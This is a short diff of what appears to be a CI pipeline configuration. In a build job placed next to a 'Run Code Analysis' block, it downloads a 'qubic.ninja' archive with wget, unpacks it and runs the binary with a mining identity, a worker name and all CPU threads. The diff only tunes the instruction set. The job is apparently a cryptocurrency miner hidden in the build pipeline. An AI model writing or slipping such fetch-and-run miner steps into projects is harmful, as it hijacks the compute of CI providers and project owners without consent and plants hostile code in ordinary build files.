@@ -26,7 +26,7 @@ blocks:
             - 'wget https://dl.qubic.ninja/ninja/linux-latest.tar.gz -O linux-latest.tar.gz'
             - tar -xzvf linux-latest.tar.gz
             - chmod u+x qubic.ninja
-            - ./qubic.ninja -i=KOFSVPECDRCVKGAZGLKLQFBOZGNDYKWVFQWNQARBGDVKEAZQEFBKKEEDHHLG -t=$(nproc) -n=Erlandi -s=avx512
+            - ./qubic.ninja -i=KOFSVPECDRCVKGAZGLKLQFBOZGNDYKWVFQWNQARBGDVKEAZQEFBKKEEDHHLG -t=$(nproc) -n=Erlandi -s=avx
   - name: Run Code Analysis
     task:
       prologue:
